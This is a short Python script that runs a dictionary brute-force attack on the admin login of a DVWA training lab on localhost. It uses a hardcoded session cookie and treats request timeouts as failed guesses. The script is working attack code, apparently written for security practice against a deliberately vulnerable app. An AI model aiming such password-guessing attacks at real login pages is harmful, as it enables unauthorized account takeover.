import requests
cookie = {'security': 'medium','PHPSESSID':'nku81sajta924jmrjmtv53f9dh'}
fp = open("./dictionary.txt","r")

dictionary_list = [x.strip() for x in fp.readlines()]
for upw in dictionary_list:
	url = f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={upw}&Login=Login#'
	
	try:
		response = requests.get(url=url,timeout=0.5,cookies=cookie)
	except requests.exceptions.Timeout as TT:
		print(f'[x] Failed... {upw}')
	else:
		print(f"[o] SUCCESS... {upw}")
		break
